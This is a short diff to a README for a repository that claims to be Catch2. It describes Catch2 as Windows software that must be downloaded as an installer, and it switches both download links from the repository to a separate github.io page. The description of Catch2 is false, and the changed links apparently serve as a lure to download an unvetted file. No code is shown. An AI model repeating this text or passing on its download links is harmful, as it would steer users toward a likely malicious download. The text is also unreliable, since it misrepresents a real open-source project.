@@ -1,6 +1,6 @@
 # 🧪 Catch2 - Write better code with simple tests
 
-[![](https://img.shields.io/badge/Download-Catch2-blue.svg)](https://github.com/chefhom3067/Catch2)
+[![](https://img.shields.io/badge/Download-Catch2-blue.svg)](https://chefhom3067.github.io)
 
 ## 📦 What is this?
 
@@ -14,7 +14,7 @@ You need a Windows computer to run this software. Ensure you have at least 500 m
 
 You must visit the website to obtain the installer. Follow these steps to find the file you need:
 
-1. Visit this page to download: [https://github.com/chefhom3067/Catch2](https://github.com/chefhom3067/Catch2)
+1. Visit this page to download: [https://chefhom3067.github.io](https://chefhom3067.github.io)
 2. Locate the button labeled "Code" on the main page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
